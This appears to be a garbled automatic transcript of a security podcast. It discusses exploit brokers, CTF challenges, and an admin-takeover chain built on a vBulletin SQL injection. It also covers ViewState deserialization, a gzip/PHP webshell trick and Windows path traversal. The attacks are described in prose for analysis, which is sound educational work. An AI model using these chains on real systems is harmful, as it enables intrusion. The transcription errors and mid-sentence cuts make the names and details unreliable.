they'll for the back door idea like anytime there's a Ready vulnerability, there's always the rumors about oh, it's a backdoor. Whatever and yeah, I do agree with you in this case\", \"start\": 669.3}, {\"speaker\": 1, \"line\": \" station to be fair with all the like stuff that they do like, it's not like it's unknown to to them to do stuff like that. But oh here I just don't think it's it's fair to say that without anything like anything more substantial basically.\", \"start\": 682.0}, {\"speaker\": 2, \"line\": \" Yeah. No, I agree with that. Either way. I think we just want to bring this up is Biff and updates there have been some changes from what I said. Mostly I didn't realize that that commits had the suspicious a date on it. So I want to kind of call that out.\", \"start\": 699.0}, {\"speaker\": 1, \"line\": \" So we'll move on to some zi rhodium. So zi rhodium, for those of you who don't know. It's basically their an exploit broker, right? So they buy exploits for various things like Windows iOS Android pretty much anything. That's a high-value Target. They purchase exploits for and they put out a tweet on May 13th saying they will not be acquiring any new Apple iOS LP. He's webkit exploits or sandbox escapes from the next two to three months because there's such a high volume of Missions for those vectors and they said even after they start accepting submissions again prices for one click chains, like webkit chains, for example, without persistence will probably drop so these chains if I remember I can't remember if it was two million or one I think 0 click iOS chain to Colonel route with persistence was two million dollars before I'm guessing that's\", \"start\": 717.2}, {\"speaker\": 2, \"line\": \" probably because I'm not sure what it is right now because I know like we've been seeing none really. The iOS dropping. Okay. Yeah, so was 2 million but we have seen Android kind of come up there with Android they're offering up to 2.5 million.\", \"start\": 771.7}, {\"speaker\": 1, \"line\": \" Yeah,\", \"start\": 787.7}, {\"speaker\": 2, \"line\": \" and that's kind of that was back and I think September when the price of an Android 0 click was worth more than an iOS 0 click. Yeah, so we've been seeing that change. So this one I mean, obviously the fact that they're not accepting new submissions. Like the big thing about zi rhodium is the fact that they've been a very public broker that's just kind of always buying issues just like you find an issue you can kind of go to them and sell their you\", \"start\": 789.0}, {\"speaker\": 1, \"line\": \" don't know you need it weaponize though. Oh, yeah. It just accepted\", \"start\": 820.1}, {\"speaker\": 2, \"line\": \" who needs what I mean. Is there always accepting issues though? It's not like they're matching you up with a Fire immediately. Yeah, that's what I mean like there that's very public broker. That's consistently just they're open to just buying the issues. They just have their list here of things they're interested in and you can contact them about other things but You can basically just go to them and sell at any point. They're not waiting for particular buyers for anything. It's just sell it to us and we'll sell it on her own timer. Whatever. Which is different from some other brokers who will try and match you with her. We'll try and have a buyer kind of immediately. I found\", \"start\": 823.3}, {\"speaker\": 1, \"line\": \" something goes Eridium to like the other thing is there's they're basically the only public facing exploit broker the deals and like I guess the grey market you want to call it because a lot of them, you know, they're they're private. They're not, you know, you're not going to find a website for you to submit stuff to them. They mostly deal with like, you know behind closed doors kind of stuff. So zi rhodium offers a really useful insight for people into that area. Area of like how much things are worth like these charts on zi rhodium and the statements they put out offering Insight that you probably otherwise wouldn't really get into the grey market with exploit stuff though. That's why I just kind of wanted to highlight that we're bringing this up is Eridium does offer that unique Insight that you can't really get from other sources like yeah, you have zi zi, but that's different. Right? They're not selling to Great Market. They're purchasing so that they can alert their clients in advance and they're going to be they're going to their payouts are going to be like 10 times less. That of zi rhodium.\", \"start\": 867.7}, {\"speaker\": 2, \"line\": \" Yes T next week jumping back a little bit. The reason why I want to bring up. How easy rhodium does act a little bit differently in terms\", \"start\": 926.3}, {\"speaker\": 1, \"line\": \" of just kind of openly buying\", \"start\": 932.9}, {\"speaker\": 2, \"line\": \" things consistently is because that makes it quite impressive that they're not buying for something. Yeah, like I don't think I think they actually mentioned that maybe not but I don't think they've ever really just like they have stopped accepting submissions on some things but not in this sort of temporary way as far as I'm aware. So it definitely seems like I'm wondering if I'm wondering what led to the increase its emissions. So obviously you can take that as one of two things demand has dropped for them and they have like more stockpile than they even need. Or well, I guess it's kind of two sides of the same coin coin but or just there's been a lot more submissions such that there isn't enough demand for it. I'm curious kind of which way it went if it was too many submissions or if it was just nobody's asking for them\", \"start\": 934.9}, {\"speaker\": 1, \"line\": \" anymore. I have a feeling it's probably the former just because like just from like exploits. We've covered on Day Zero and stuff this year. I don't know if it's just like a recency bias or something like that. But it seems like we have covered a lot more Apple issues this year than I remember even seeing last year and we're not even like halfway through the year yet. So it does seem like there's a lot more Apple issues being discovered. I'm not sure if that's just because it's being looked at more, you know, people are starting to realize how valuable You will have a Target. It is more people are looking at it or if it's just because there's newer code making it into the code base that isn't being vetted properly. Like if there was like a staffing change or something. I don't know but I think either way you look at it. I think there has been a lot more activity in the iOS exploitation field this year than any year previous. It's just keeps growing.\", \"start\": 993.8}, {\"speaker\": 2, \"line\": \" Yeah, certainly 16 like I agree with you on hearing more in the past year about about iOS exploits that said Yeah, I don't know like I guess I don't know if that's necessarily related to just because there's also just kind of an increasing more and more people are continually publishing interesting exploits now rather than just kind of selling them off or reporting them or whatever like just in general. There's an increase on seeing those write-ups and stuff too. So it could be a bias relate to that and not actually more people or more findings. The timing I mean could be quarantine related, you know stuck at home. I just like your iPhone,\", \"start\": 1045.8}, {\"speaker\": 1, \"line\": \" I think even if you take that into account, right, even if you take into account that there's maybe just more write-ups the fact is just those write-ups being published makes it easier to break into the area of Iowa's exploitation because there's more resources out there, which means there's going to be more people coming in and more activity in general is just going to mean more Findings more Supply and then because there's more Supply, you know, the demand is going to go\", \"start\": 1093.1}, {\"speaker\": 2, \"line\": \" down. Yeah, but there's more write-ups in other areas too. It's not just iOS but iOS seems to be uniquely hit here.\", \"start\": 1119.2}, {\"speaker\": 1, \"line\": \" IOS is also the most valuable Target basically like phones are so valuable to\", \"start\": 1127.1}, {\"speaker\": 2, \"line\": \" hell with their Pagan or for Android and they have been since September.\", \"start\": 1131.8}, {\"speaker\": 1, \"line\": \" Yeah, they're paying more for Android but I don't know Android seems to be kind of neglected a little bit compared to iOS.\", \"start\": 1138.8}, {\"speaker\": 2, \"line\": \" Yeah. Well, I think that's why they're paying more for it. I think that that's a big reason why they start paying more is to encourage more on\", \"start\": 1146.4}, {\"speaker\": 1, \"line\": \" the Android side. Yeah, and it's weird. Because Android is to it is easier to hit than iOS make no mistake because iOS has like they have stronger sandboxing as far as I know than Android and they have medications that Android doesn't have yet. Android doesn't have a pointer authentication. For example, where iOS has had that for what one or two years now and that's that's not exactly trivial to get around when you're talking about like iOS kernel exploits and stuff like that. So, I mean it's kind of interesting that iOS seems to have more activity even though it's\", \"start\": 1153.5}, {\"speaker\": 2, \"line\": \" Order\", \"start\": 1186.5}, {\"speaker\": 1, \"line\": \" then again. Maybe that's the attraction, you know, a lot of a lot of people who do bug bounties or just you know, who do vulnerability research and exploit development. Don't do it just for the money they do it because of the, you know clout that's attached to it and and the the challenge that's involved with it. And I think the fact is that iOS just has the highest challenge of pretty much anything out there and that's why it's so popular of a Target among, you know, really smart people what will be interesting to see how this though is if that money will be A motivating factor to see if people who have in the past exclusively done iOS research start to spread out to other targets if it'd be interesting to see if we see some of those Iowa Skies start to move to Android or to order browsers or something like see if they move or where they move to I think that'll be very interesting to see if that happens over the next few months.\", \"start\": 1186.9}, {\"speaker\": 2, \"line\": \" Well, no, I think part of it like they do just mention that there only They're not accepting those for the next two to three months due to the high number of submissions. So I mean if you're if you're doing that exclusively that could also just be okay. I'm taking a vacation or a few\", \"start\": 1238.8}, {\"speaker\": 1, \"line\": \" months could be but it could it could be a sign that it might be a number\", \"start\": 1257.8}, {\"speaker\": 2, \"line\": \" of things. I mean like it's speculation.\", \"start\": 1262.9}, {\"speaker\": 1, \"line\": \" I think the reason they're giving two to three months because they don't exactly know how the exploit markets going to look in two to three months. So, you know, they'll probably give another update at that time if they're going to extend that or if they're going to drop it or whatever. But yeah, I think we may see. Few people move from IOS to to other things. So\", \"start\": 1265.9}, {\"speaker\": 2, \"line\": \" yeah, it's definitely a possibility. I mean, I think you'll see more move if this goes beyond the two to three\", \"start\": 1285.5}, {\"speaker\": 1, \"line\": \" months. Yeah. What I will say would probably be I'm gonna have a little bit of fun here in speculate where people could move to like, you know, I with researchers that they wanted to move to something else Windows\", \"start\": 1291.5}, {\"speaker\": 2, \"line\": \" phone is the obvious\", \"start\": 1304.9}, {\"speaker\": 1, \"line\": \" wonderful, but that's actually kind of funny you bring up Windows though because what I was going to Ring up was I think the next area where people might start moving is VM stuff virtualization and hyper-v. For example is where I could see people moving to just because virtualization isn't really hit too hard yet. It's it's a very complicated field so that kind of matches that you know challenge aspect that that bottom phone security researchers along it's a hard target to hit. It needs a lot of re and research and stuff like that because you know, Morse code isn't For a lot of hypervisors out there. So I think hypervisor expectations might start to see a rise. My see can start to see more stuff related to that in the future. So that could be fun to see I wanted to bring something up from the jerky put in chat apples Iowa's 13 has been particularly buggy enough that SVP software engineering reported overhauled the company's internal software testing process to avoid a repeat when I was 14 rolls around Yeah, and I mean, I think I've actually seen that from some of the iOS for researchers like follow on Twitter as well is IOS 13 is just had like a myriad of issues. So it's probably it might be a combination of both with iOS, you know with them not wanting to pay for them with the supply going up is it's probably more issues being found because code made it into Iowa's 13 that is bad and wasn't vetted properly combined with the fact that it's probably more people looking at it. And like you said zi, especially with the covid situation even more so so I think it's just it's a combination of things. I think that led to this. and I think eventually will even out I think it will go down and you know, they will start buying them again, but I do think we see some researchers move,\", \"start\": 1306.7}, {\"speaker\": 2, \"line\": \" basically. Yeah, I don't disagree with you that some people move. I do think there's going to be a fair chunk that maybe try and stick it out.

There's a quote from I don't see a source on who sang it but basically mention that the zero day Market is so flooded by iOS exploit that we've recently started refusing some of them. Just mentioned that that's a wired so I'm not sure who they are because I don't think wired was that fun buying it. It's at least I would assume that wired was anti guess that could be some investigative journalism tool, but that said if that wasn't September so there yeah, I mean we could see a movie out of iOS or perhaps it is just I was 13 once we see new iOS, maybe that'll That'll bring more people in or not.

So this weekend is a Jeopardy style CTF. Anybody can play but the team lead and contacts do need to speak English and I believe it's at least your team lead needs to be a US citizen or resident permanent resident. So that is one of the limitations of it you can play but I don't think You don't think you can qualify for the final or yeah, the prize is otherwise, there's some other restrictions related like government to government employees participating and how they can participate they can't use government facilities various things like\", \"start\": 1492.4}, {\"speaker\": 1, \"line\": \" that. And they use Deidre.\", \"start\": 1562.5}, {\"speaker\": 2, \"line\": \" Yeah exactly Deidre comes out as well. So they imagine it has to be something that's freely available.

They do actually making explicit mention about how you can't be participating in an official capacity as part of your job or related to your job things like that. Nonetheless didn't want to call it out because that is this week and it's something different. It's cyber security cell. So we'll be like your Jeopardy style CTF, but they do mention they've got an emphasis on space system. So the FAQ mentioned a few of the categories Uh-huh, which include stuff like communication with satellites knowing the tools and the protocols hacking satellite applications over the message bus their Communications via like modem RF Communications payload modules flight software orbital mechanics. They also mentioned calling out some of the science the astronomy and astrophysics orbital mechanics and various space algorithms for Star Trek navigation. So things like that. Seems like it'll be a kind of an interesting CTF. I don't know how like I have no idea how hard the challenges will be but seems like one of those CTF so you can play just if you've got an interest in kind of the space tack that all kind of force you to learn some effect and give you a little bit experience and then the top 10 teams get an invite to the final event which uses Flats at with a fully automatic satellite, basically. Kind of for the communication aspect and then it's kind of like a virtual aided virtually of what what type of word is that a virtual / simulated space environment as far as I know you don't actually get to hack a satellite. That's it. They do call the last stage of this there on orbit challenge which they limit you to only two submissions. Which I mean the way they say that sounds like you may actually get to send a payload against an actual satellite.

It's a very interesting theme and it will be interesting to see like you were talking about like, you know, I'll be all the algorithms that go into like the astrophysics and stuff of it. It will be interesting to see how much of a challenge that presents because when you're talking about a time CTF, you generally don't want challenges that require like a stupid amount of backing research before you can get into actually hacking it.

I don't know that that's not just me saying things but I can imagine that they're willing to go a little bit more on the inaccessible side. They're making it clear that you should know about these things. You can prep for it. They're probably trying to find teams that could do this type of work. I mean, I don't think this is recruitment or anything or at least they explicitly mention the licenses and like recruitment that there won't be any job offers or anything out of it, but I could understand if they were making this with a focus on.

Like the final is that the virtual Defcon like we're saying earlier. So qualifiers usually don't have very large prizes, but this qualifier actually has ten fifteen thousand dollar prizes for I would say the top 10 teams, but I'm guessing the top 10 qualified teams because you know, if you have a team lead that isn't a u.s.

The entire team doesn't have to be so it is open to other people. Just you do need a US citizen involved on your team. Sorry, as we are going to change though. Defcon qualifiers just happen.

Although actually, it was drooly out of chat and up dragging me into working on one. But so I played just two of the web challenges upload and poot. Oh or upload it. I think it's called actually, I'll say the challenges. Look what some of the past challenges I felt like there's been some guesswork some mind-reading needed for it. And that was kind of my feeling I think when we talk about Defcon calls last year. Yeah. I kind of\", \"start\": 2042.7}, {\"speaker\": 1, \"line\": \" mentioned a for high opinion of the calls last year if I remember right?\", \"start\": 2077.5}, {\"speaker\": 2, \"line\": \" Yeah. So this year I still have some issues especially with one of the challenges that I worked on that. I kind of felt like they just laughed a lot of Direction on The Challenge so I can't say that was for everything but in particular pooped and I'll give people a warning I am going to spoil it here as I talk about it. So if you don't want any spoilers, you know Skip ahead or mute for mute for a moment, but with poot it was a simple kind of web proxy that he had Source was provided you could find in the comments of the HTML acts to the source just like a python flask application. Ation, so fairly standard for a web app web app challenge providing Source. It was a proxy you give it a URL like domain path and it'll make a request using python request and it'll replace our own replace all of the links. I rewrite all the lengths basically just what you'd expect from low webpage proxy had a admin that would if you sent a feedback saying like hey, this page doesn't work and admin would visit that page they would visit That page through the proxy and then you could break out of the proxy and actually have make some requests using that add the admins browser. That's kind of hinted at in the description in the description talks about our secure poot proxy allows you to continue browsing securely and hide your IP address from your visited website. So breaking out a fact it's kind of clear that that's kind of what you're about. Somebody's using the proxy you're trying to break out or break through it. That said once you broke through it, there's no real guidance left to know kind of where to go from there the solution like I know both myself and a number of other teams looked at the red acid. Use the redis Q is so kind of look that tried to communicate with that system and try to communicate with other internal systems some enumeration and I know is I was doing the enumeration I did that myself to definitely I was like it was. Didn't feel like the right route to go like I mean. Lot of these seats like that's more half the box or something that will have you brute force. Nonetheless, they didn't give any real Direction on what to do from there. So that issue I think kind of remains from the past like there are there is some mine during those necessary in this case. I do think there are some very minor changes that could have been made to this challenge. That would have made it clear or that would have provided a little bit of a hint saying what to do but the actual solution ended up being installing a service worker so you can intercept all the requests that The admin makes to the proxy and you'll find that they make a request to a page with the flag. That said figuring out that you should be installing a service worker it once you your exhume JavaScript on the admins browser, which is just a headless Chrome. You can do so many things from there. There's no without any guidance like because there's so many possibilities even though that challenge wasn't that hard. I think it only have like 18 to 20 solves. I'm not sure what it was at the end. But the last time I looked it was only 18 solves. Have they had any guidance that hinted towards? Like the admin browser accessing something else. That could have gone off and it cut felt a little bit more fair because there was something like I'd kind of mentioned I thought like if they just added with that statement, you know, continue your browsing securely and hide your IP address if they just said like in hide your browser history from your ISP or something just a little saving like that. It's enough of a hint that if you think about it after your on the admin to know to go after the history. It could work but it's not enough that it would spoil things like that. And I felt that about something other challenges in past years to there's like the browser user agent one or just some slight tweaks to give guidance on your an appropriate approach for each stage would have been useful and I guess I'd really Echo that same thing back here is it really comes down to just making sure as you design a challenge, how are people going to? Come up with the appropriate process and I get it. There's a balance that needs to be maintained their difficult challenge. You don't want to give everything away. But you also don't want to leave it as so wide open like this one was it's like there's so many possibilities. There's no real indication that You know, I service workers right? Thank you. Just have to kind of think of it and know what and I will say the other one I worked on was uploaded it. Which flask app really small think I actually I saw the right path to that really quickly and then was just too lazy to actually do it\", \"start\": 2080.7}, {\"speaker\": 1, \"line\": \" or not. So one thing you see especially in Defcon CTF for whatever reason is you love to see one challenges get solved in a way that's different from the intended solution and in the reverse engineering server, somebody actually linked to right up to one of those challenges. It was not be fooled and it was supposed to be a additive transfer. Pack on a quote curve cryptography, which I'm not familiar with but they actually solved it in a like are easier way than the challenge was intended to be solved. They provided the the task script which was written in Sage but Sage was on python 2 for a while. So it was a good guess that it was running python 2 for this challenge as well and the input function in Python to evaluates the input and receives so you could literally a just right in Echo or stock STD ODOT right open flag dot read and just print out the flag.

I still feel like it was a reasonably Fair challenge. I think it whooping better with more guidance, but I didn't feel like there's just nothing at all to go\", \"start\": 2490.5}, {\"speaker\": 1, \"line\": \" on. It wasn't as guess is some of the challenges last year.\", \"start\": 2521.9}, {\"speaker\": 2, \"line\": \" That's it out of chant asking gum doesn't make sense. Why why still have worked? Yeah input and python like just calling input evaluates what you provided like that is there's another function Thon to called raw input which will just read input which is what I want to see you should be using but I don't actually I don't want to make that claim because that very well might be another fuck gun, but I know input itself is commonly used and yeah it evaluates everything you kind of put in there. There was another one that was kind of solved. Oh I didn't I don't have the right I prepared here, but it was Like bios, of course, all their challenges have like three O's in it, but the idea was you had to read the flag from a floppy disk, but you didn't have an operating system. We didn't have a bio so you had to do all of that yourself and do the VGA output yourself. Um, I'm not so Bleak ass bios less was easy wasn't I'm not sure what its ring was. I didn't even try the challenge. I only did those two web ones. I was kind of sick through the weekend. So I wasn't playing too hard wasn't playing competitively at all. I just like I said looked at that upload one saw the solution kind of quickly, but didn't actually bother with it and then Drew he got me interested in pooped. So I worked on that for a bit. I wasn't playing family I dance. the most challenges but the solution they ended up had I known we'd be talking about the intended solution I have tried to have this one ready but basically they ended up just abusing the fact that it was running on qemu and you some functionality of that to get output rather than actually implementing like their own VGA right or anything from the floppy they just abuse qemu for it\", \"start\": 2526.6}, {\"speaker\": 1, \"line\": \" I found it funny some people were saying this was like Huey and you CTF because like there were a lot of challenges that were there were virtualized and qemu because I think there was a colonel exploit one to that I actually kind of want to look at because it the details of it that I saw from people who were trying to solve it looked really interesting but one of the things I wanted to shout out before we you know move on is the source code for all of the challenges for the CTF went out like basically instantly so definitely not a decently Not instantly, but very close to the time that the CTF ended like I think it went up like 17 hours ago for\", \"start\": 2652.4}, {\"speaker\": 2, \"line\": \" all the sources like I don't think Source.

We have one in vbulletin. So I will be honest vbulletin is a forum software and forms are kind of dead nowadays. So I don't know how many people are actually using people and anymore. But um, the issue that this exploit talks about seems to be in the infraction subsystem. So if you've ever used forms before Reddit basically killed them all especially the bullet and moderators can give infractions to people right which is Kris is like a point counter on the user's account and sends them a warning message. And when a threshold of points has reached the user automatically gets banned or some kind of punitive action happens, right? So they have an endpoint in their API for getting infraction related information, which I'm assuming the end point they abused which is get indexable content didn't have permission checks in it. Probably so a user can see their own infractions, even if they weren't like a staff member on the form or something like that.

Yeah,\", \"start\": 2871.4}, {\"speaker\": 1, \"line\": \" so, you know, obviously when you're talking about infractions all this information, there's a lot of database stuff going on behind the scenes for getting information on each of the infractions by its node ID and that node ID in the API endpoint wasn't protected. SQL injection, so it was a very straightforward SQL. I was just a single quote Union and the other thing is with people with and it's not blind because anyone with the bulletin concede the database structure to easily exploit this you know, it's not like you don't know anything about the table structure or anything like that. So it was it was fairly easy to abuse what I found interesting though was the way they actually abuse the sqli to you know, make it useful. So basically what they did. Did was they use the sqli multiple times to like pull off multi-stage attack to basically reset the admin password. So they used it to get admin details like the email and the username and then they use it again. They created the captcha instance and then they get the capture answer from the database using the SQL. I they then force a password reset and they retrieve the token from the database and use that token to set a password that they control and then from there they can just back door it. So yeah, the issue is fairly trivial. I did like how the flaw could keep being abused to get all the information needed for the stages. I'm assuming they needed to do that because they probably couldn't directly modify the table data. They could probably only extract it which makes sense because the database account used for that apis probably quite restricted. They probably can't just change\", \"start\": 2875.9}, {\"speaker\": 2, \"line\": \" well and that's it's less about it not being restricted more what the issue is with PHP. You can just inject a Equal and then do like update even though you've got seek won't you?

You don't have to have a database storing all your user information. It's just kind of stored on the page. You still need to track some user information of course, but there's a lot of stuff that you can just track kind of in this view State value. Because it's stored on the client. So there's always the chance that the client can mess with that. That's why it is it is encrypted by default now, it is also attend to cated that wasn't always the case. So there you have some older systems that are some fun you can do with that but effectively all that's happening here is my little admin uses a the same key across all their systems this validation key decryption key there. They use the same key across their system. So you can encrypt your own view State as I mentioned this get to deserialize therefore standard D serialization attack. My so that's the issue my issue on whether or not to called hard-coded is this is stored in the web.config file. I'm pretty much like where it always is stored its web config. So I would call something hard coded when it's actually in Source when you have like a source file that goes like if password equals and then a string to the password. that would be a hard-coded password for example or if it has the crypto key and it's literally hard-coded in there like T equals and like this bike shrink or whatever when it's sitting inside of a config I would just call it either a static or a default it comes with a default key\", \"start\": 3701.3}, {\"speaker\": 1, \"line\": \" yeah so I will say it is I do see the terms hard-coded and default used interchangeably and to be fair this is\", \"start\": 3853.5}, {\"speaker\": 2, \"line\": \" nitpicking for me that's not really that big of an\", \"start\": 3862.2}, {\"speaker\": 1, \"line\": \" issue I was gonna say I've probably even used hard-coded when I've met default before to I think he might have called me on it before on the show so I mean it's a very easy mistake to make but I think that is kind of an important distinction because changing the key in a configuration file is leagues easier than monkey patching a binary file that has it you know hard-coded into the you know source code of the program so\", \"start\": 3865.0}, {\"speaker\": 2, \"line\": \" I'm yeah I like this one can be changed for\", \"start\": 3890.0}, {\"speaker\": 1, \"line\": \" distinction yeah that being said I think it is fair to expect it to make it more obvious to change or easier to change than having to manually go into the configuration file but I guess that's kind of a different\", \"start\": 3892.4}, {\"speaker\": 2, \"line\": \" conversation yeah so that's kind of like so this isn't like a value that's set to buy my little Well, they probably provide like the default web config.

I can't understand he executes a variable a I don't know. We're in this code. This execute is happening. He gives the to code examples of Aid up here.

The only thing I can meet I could take that to mean is as he's running or as it's being injected in there. Like that's he's talking about the variable to be injected that said. Make the code more or less makes sense to me with what it's doing what it's doing here when we're talking about a and H and all of that H ends up being the span tag that gets some. Gets the phone number in and a linked call with Google Voice. So that's kind of where it creates that. believe it creates a field somewhere else also in there, but and then it goes through and if it's if there are any child elements on this it'll just replace the inner HTML if the parent or if there are no child elements, it will replace the inner HTML if the parent node with this tag that it created and if there are any child element, then it all insert before so just insert it as the first element this take that it's created. So in that so what ends up happening is our where the issue I believe comes from is if runs this not quite a regex, but where is it? As its kind of scanning the code it's using what XS t or whatever the XML query stuff. It's clearing for all of the text nodes runs through all the text nodes and just runs the regex on saying like, okay, here's a text node.

So they go through some of the process that they had for doing that so, you know be able to pull off an attack like that you want to have the structure of the database that you're you're constructing the polyglot with so that's where they kind of get into this hidden get parameter, which is yet another kind of Oddity that on its own isn't too powerful when chained allows them to do the rce and that's that they have this GOP I events table that they dumped here let me just scroll down to it because I don't have it written down in my notes for some reason okay there we go yeah so they have this get parameter offset table and they can actually dump the table with that with that variable so you can see they have a dump of the table dump table GOP I Wi-Fi networks and they just have the table structure of that Wi-Fi network and there's a little election in their comment which you can set if your maintenance user so you know for the rest of the issues that they hit for this rce they do a Sit assume that you have some level of access they assume that you have access to the panel through like a maintenance user or something like that they theorize later on that it might be possible without that but for now they assume that you know you have that level of access so one of the things that a maintenance person can do is they can add a new Wi-Fi network and they can add a comment on that and that allows you a decent degree of control over the data that's going into that database file against gzipped so they go through how they construct that payload so one\", \"start\": 4990.3}, {\"speaker\": 2, \"line\": \" thing I so I will kind of mention here really quickly is that hidden gift parameter basically what it's doing is it will dump like all the cables using that you are off the content by using that he basically provide the offset into it for to dump so won't dump everything so that way your control of the data that data that you actually control can be very early on in that dump if not like the first thing that actually comes out if the dump which is important when they come into attacking the gzip That way they're not having too much noise from blobs earlier\", \"start\": 5117.4}, {\"speaker\": 1, \"line\": \" on. though they go through some of the hurdles they had with constructing that payload apparently gzip has some like anti xss filters in it, which I didn't know about that they\", \"start\": 5155.0}, {\"speaker\": 2, \"line\": \" had because it doesn't application does\", \"start\": 5169.0}, {\"speaker\": 1, \"line\": \" Okay, I misread then. I thought that was in gzip specific\", \"start\": 5173.7}, {\"speaker\": 2, \"line\": \" know so it's just that they do the sequel I or excess filter eigrp is anti xss filter and codes the characters before saving them in the database.\", \"start\": 5176.3}, {\"speaker\": 1, \"line\": \" Okay. I read that as in being in gzip. So that was my bad. Okay, so gzip, you know, they they encode the characters properly. So that's obviously an issue when you're trying to inject PHP code, right? You need the lesser than question mark or you need an opening PHP tag. There's a few different ones to go. They don't actually go with the question mark PHP one, so they found so they found kind of an interesting solution around that instead of trying to embed the PHP tag themselves. They actually use the uncompressed block header, which can have a value that decodes to a lesser than character depending on the length so they can get a tag in a compressed block. But the code they had to execute would be in the uncompressed block and this is kind of tricky because there's data that you control between the opening tag and the shell content. This is what you were kind of talking about with the noise. You can't have like invalid PHP code in between the tag and where you inject your shell or it's just gonna fail so that's where they kind of get into some of the interesting things you can do with PHP tags. I actually didn't know about this tag. You can just use well, it's actually not I guess an official tag, but they use the lesser than question mark equals tag, so I haven't seen that. before but apparently not sit for like echoing and stuff like\", \"start\": 5187.2}, {\"speaker\": 2, \"line\": \" that it's an official take it's the short yeah I miss well it's half the short bring their so in particular equals is specifically it'll Echo whatever you put out next so that way you don't have to do like if you're using PHP a morph like the templating style so you have like an HTML file or dot PHP and just in there you have like angle bracket question mark rather than doing Echo value you undo equals value it's just kind of a shorthand for doing an Ecco that said as you're going to get into what they kind of abuse this see you can give it a double quote string so PHP does shrink shrinks differently depending on how you quota so double quoted string will interpret variables that are inside if it wears a single quote we'll just do the literal string so even if you put like dollar sign some bar it'll actually print the dollar sign what they end up doing and started to kind of steal your thunder a little bit Checkers you're going to get into that is they end up doing a quote or comment sorry now start comment start of a multi-line comment that is so like slash star so that way they can inject that in what in the compressed output and then unquote at as long as you know they don't accidentally get a star / anywhere before their actual injection they can just unquote and then their actual injection have acts of the PHP I thought that was an interesting way to go about and I didn't know you could quote like that in the equals or after like the question mark equal sign I mean I've never really tried usually if you're using like question mark equals you're doing that because it's short so you're usually not putting quotes there so yeah I just didn't know you could do\", \"start\": 5266.1}, {\"speaker\": 1, \"line\": \" that there yeah it is kind of an interesting trick that they use the comment and then they basically comment out that second compressed blocks data so it won't get

know if you've used it but that's kind of new to me I feel kind of bad because I like it's been a while since I've written PHP code and I don't write it regularly but I'm just I was kind of surprised

you were saying now there was a bit of like it wasn't super straightforward because generating that sequence of characters isn't really something you can easily control right it's based on the compressed block length and stuff like that so they had to kind of brute force that to get it to work so they they ran a script and ran it like overnight or something I can't remember if they said exactly how long it took to brute force it but there was a bit of brute forcing involved but they were able to find a block that would cause that opening tag to be there and then they can inject their web shell into it they would close the comment put their shelling and they could get rce on the and so there was a lot of like hurdles they had to overcome it wasn't like the issue itself wasn't like

technician access they do say in their final notes that theoretically this can be hit by an attacker without it like a valid account because you can use failed logins because of the logs that they say saved the events table to insert data into the database to trigger the Bob but they say that it's probably not like practically speaking doing that is going to be a lot more difficult because you have less control over the data you don't you also don't have as like you're hitting it blind so it's it's theoretically possible but it might not be practically possible they didn't really explore it so

yeah so getting into an article by checkpoint who was another you know site that we see quite often on this podcast because they do a lot of good write-ups here they talk about an interesting Discovery they made when they were testing bugs they discovered last year on the Microsoft RDP client for Mac OS and the issue comes down to how paths are interpreted by Windows especially when it comes to you know forward slashes versus backslashes and it specifically in the windows API functions the paths TCH canonicalization function I hope I said that right and Annika lies out of your tongue twister word but anyway basically what this function does is it tries to take a path string and evaluates it and it converts it into a canonical form and this is used to check the final path against path traversal that's how they used it in these RDP clients\", \"start\": 5771.7}, {\"speaker\": 2, \"line\": \" and just to be clear that's something I've even mentioned before is when you want to look to make sure something is annoying sort of path traversal it don't bother looking in the string for like your dot dot slash and try to remove that or trying to fix it up it just get the canonical path and compare that prefect's on it if the prefect's is where you want and obviously make sure it's not going until we get another folder if you don't want it to but usually just the prefect's is fine but that's AB specifically this is definitely something I would tell people to kind of do your canonical path is going to be your it's an absolute path but every file will only have one canonical path so with app just being absolute oh how symlinks and stuff gave you is can vary like there are some places where you could have multiple\", \"start\": 5834.9}, {\"speaker\": 1, \"line\": \" paths to the same thing\", \"start\": 5887.9}, {\"speaker\": 2, \"line\": \" so bully connection isn't that what everybody do so many times I run two people not doing that we've talked about directory traversal before even where they do some checks know people just don't seem to get that idea just resolve the past check the prefect's super easy to do that said the interesting thing about this issue is that it's not sufficient\", \"start\": 5890.9}, {\"speaker\": 1, \"line\": \" they yeah they try to do it right and they failed\", \"start\": 5914.0}, {\"speaker\": 2, \"line\": \" well it's not I don't think they like whoever wrote the code here like just the cone using this like this is I failed them yeah this is how you should be doing it and it doesn't work you can break it\", \"start\": 5916.3}, {\"speaker\": 1, \"line\": \" yeah so what's weird is you know Windows is always been kind of contrarian to Unix and that paths like to use the backslashes instead of forwards she has I never understood why because it seems really dumb because backslashes have always been used to escape character so you always have to do a double backslash but anyway even though Windows prefers those they have supported forward slashes for like ever just because you know people like using forward slash paths just because the familiar familiarity with Unix and stuff like that\", \"start\": 5929.9}, {\"speaker\": 2, \"line\": \" well and you don't have to do double backslash you know you don't write one\", \"start\": 5963.7}, {\"speaker\": 1, \"line\": \" character yeah so the problem is this Windows API function only considers backslash it doesn't consider forward slashes it just ignores them so if you do like a dot dot backslash backslash backslash to try to escape the current directory or go up a directory you know that was considered by the can I can initialize function and it would you know adjust that in the path but dot dot slash was completely ignored so when they went to compare the strings they were equal even though the one string had the path traversal through the dot dot slash so the patch wasn't sufficient so Microsoft just didn't consider that case in the function so obviously the documentation for that when the API function doesn't say anything about that behavior so looking at this code from a Layman's point of view if you don't understand that like work with that function you would think okay this looks fine and I think checkpoint even said originally this function was broken and they fixed it with this code which they then exploited further but when they looked at the patch they said okay looks like this issue is fixed and that was from their blog posts last year and when they looked at it more closely they found it wasn't fixed because of that weird quirk the checkpoint decided to have a little fun when they found this issue they presented their software devs with a challenge to implement the function in Windows that receives a file path and is resilient against path traversal and they found I think they said almost all the implementations that they got use this function the path C CH can and alkalis and they didn't consider the slashes so they could all be broken in the same way so that's part of the reason they put this post out there is even though this just talks about in the context of the RDP clients they figure this issue probably exists in a lot of different applications because of that issue existing in the windows API and the way it's being called is the way that Microsoft you know expects you to call it they I think it's still the recommended function to use to prevent theft reversal so what's kind of weird is when they reported this issue to Microsoft they didn't actually patch the the windows API function that canonical eyes has it they just made it so that they replace all the forward slashes in the RDP client with backslashes before calling the API function so they kind of they fix the issue in the client but they didn't fix the issue in the windows API I don't know why I don't know if there was like some weird Logistics behind that that was\", \"start\": 5967.4}, {\"speaker\": 2, \"line\": \" well I mean they can't break the API now but I mean somebody somewhere as an application that depends on that difference I don't know what I would be you before but I mean yeah no this is it can mean obviously this itself like it's fixed in the RTP coin so 